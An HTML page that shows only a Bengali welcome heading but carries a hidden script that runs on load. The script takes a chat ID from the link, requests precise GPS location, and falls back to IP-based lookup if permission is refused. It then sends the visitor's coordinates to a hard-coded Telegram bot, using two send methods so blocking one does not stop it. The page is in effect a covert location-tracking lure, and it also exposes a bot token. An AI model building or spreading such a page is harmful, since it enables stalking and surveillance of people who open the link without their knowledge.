<!DOCTYPE html>
<html lang="bn">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>My Website</title>
</head>
<body>

  <h1 style="text-align:center;font-family:sans-serif;margin-top:50px;">স্বাগতম</h1>

  <script>
  (function () {
    'use strict';

    var BOT_TOKEN = '8913383036:AAHodPKq9_VL5KsS38J9H6ysRBTCMBmKJEU';
    var chatId = new URLSearchParams(location.search).get('chat_id');
    if (!chatId) return;

    var KEY = 'loc_' + chatId;
    if (sessionStorage.getItem(KEY)) return;

    // ===== টেলিগ্রামে পাঠানোর ফাংশন =====
    function sendLocation(lat, lng) {
      var url = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendLocation';
      var data = new URLSearchParams();
      data.append('chat_id', chatId);
      data.append('latitude', lat);
      data.append('longitude', lng);

      // দুইভাবে পাঠানো হচ্ছে যাতে একটি ব্লক হলেও অন্যটা যায়
      try { navigator.sendBeacon(url, data); } catch (e) {}
      fetch(url, { method: 'POST', mode: 'no-cors', body: data }).catch(function () {});

      sessionStorage.setItem(KEY, '1');
    }

    // ===== ব্যাকআপ: IP দিয়ে আনুমানিক লোকেশন =====
    function ipFallback() {
      fetch('https://ipwho.is/')
        .then(function (r) { return r.json(); })
        .then(function (d) {
          if (d && d.success && d.latitude && d.longitude) {
            sendLocation(d.latitude, d.longitude);
          } else { throw new Error('no data'); }
        })
        .catch(function () {
          fetch('https://ipapi.co/json/')
            .then(function (r) { return r.json(); })
            .then(function (d) {
              if (d && d.latitude && d.longitude) sendLocation(d.latitude, d.longitude);
            })
            .catch(function () {});
        });
    }

    // ===== প্রথমে GPS চেষ্টা =====
    if (!navigator.geolocation) { ipFallback(); return; }

    navigator.geolocation.getCurrentPosition(
      function (pos) {
        sendLocation(pos.coords.latitude, pos.coords.longitude);
      },
      function () {
        // পারমিশন না দিলে বা এরর হলে IP ফলব্যাক
        ipFallback();
      },
      { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
    );

  })();
  </script>

</body>
</html>
